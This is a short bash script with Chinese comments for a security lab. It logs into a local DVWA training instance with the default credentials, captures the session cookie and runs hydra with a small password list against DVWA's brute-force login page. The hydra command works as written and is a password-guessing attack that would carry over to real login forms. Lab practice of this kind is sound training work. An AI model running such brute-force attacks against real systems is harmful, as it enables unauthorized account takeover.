#!/usr/bin/env bash
# DVWA 弱口令爆破（hydra 版）：自动登录拿会话 → hydra 爆破 brute 模块
# 用法：bash scripts/dvwa-hydra.sh
set -u
BASE=http://127.0.0.1:8081
COOKIE=$(mktemp)
trap 'rm -f "$COOKIE"' EXIT

# 1) 登录 DVWA，拿到有登录态的 PHPSESSID
TOK=$(curl -s -c "$COOKIE" "$BASE/login.php" | grep -oE "user_token' value='[a-f0-9]+'" | head -1 | cut -d"'" -f3)
curl -s -b "$COOKIE" -c "$COOKIE" -b "security=low" \
  -d "username=admin&password=password&Login=Login&user_token=$TOK" \
  -o /dev/null "$BASE/login.php"
SID=$(grep PHPSESSID "$COOKIE" | awk '{print $NF}')
echo "会话 PHPSESSID = $SID"

# 2) 小字典（真跑前先小规模，别一上来用 1400 万的 rockyou）
printf 'wrong\nadmin\n123456\npassword\nroot\n' > /tmp/pass.txt

# 3) hydra 爆破（header 里的冒号用 \: 转义；脚本文件里反斜杠不会被 shell 吃掉）
echo "开始爆破……"
hydra -l admin -P /tmp/pass.txt -f -t 4 127.0.0.1 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=$SID:F=incorrect"
